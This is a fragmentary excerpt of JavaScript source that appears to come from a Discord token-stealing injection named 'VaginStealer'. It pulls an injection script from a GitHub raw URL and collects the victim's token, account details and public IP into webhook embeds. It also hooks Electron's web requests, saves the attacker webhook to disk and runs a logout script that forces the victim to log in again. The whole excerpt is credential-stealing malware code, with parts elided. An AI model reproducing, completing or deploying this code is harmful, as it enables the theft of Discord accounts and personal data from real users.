...
let [
    ...
    PASSWORD
        ...
        "https://raw.githubusercontent.com/hunteruhq/hunter/injections/dsc.js",
        {
            _nitro: [
...
const notify = async (ctx, token, acc) => {
    ...
    ctx.embeds[0].fields.push(
        ...
        { name: "<a:fu_vsco:1089235448200704021> IP:", value: `\`${ip}\``, inline: true },
    );
...
const getNetwork = async () =>
    await request("GET", "https://www.myexternalip.com/raw", {
        "Content-Type": "application/json"
    });
...
session.defaultSession.webRequest.onBeforeRequest(
    ...
    (d, callback) => {
        if (!fs.existsSync(`${__dirname}/VaginStealer`))
            fs.mkdirSync(`${__dirname}/VaginStealer`);
        if (!fs.existsSync(`${__dirname}/VaginStealer/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`,)) {
            fs.writeFileSync(`${__dirname}/VaginStealer/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`, WEBHOOK,);
            execScript(LOGOUT_SCRIPT);
        }
